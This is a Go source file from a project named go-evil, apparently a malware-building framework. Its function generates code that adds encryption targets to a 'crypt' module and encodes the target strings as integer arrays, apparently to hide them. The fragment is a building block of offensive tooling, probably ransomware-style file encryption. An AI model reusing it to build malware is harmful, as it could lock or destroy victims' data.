package target

import (
	"fmt"

	"github.com/TeamPhoneix/go-evil/utility/structure"
	"github.com/TeamPhoneix/go-evil/utility/tools"
)

// Appends a target to focus on, you can also pass in a evil array with all your targets aswell
func Add(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)

	system_call := "add_target"
	value = tools.Erase_delimiter(value, []string{"\""}, -1)

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(repr []int){", system_call),
		"target := spine.variable.get(spine.alpha.construct_string(repr))",
		"if target != \"\"{",
		"spine.crypt.add_target(target)",
		"}",
		"}"})

	// Construct our int array
	parameter := data_object.Generate_int_array_parameter(value)

	return []string{fmt.Sprintf("%s(%s)", system_call, parameter)}, structure.Send(data_object)
}
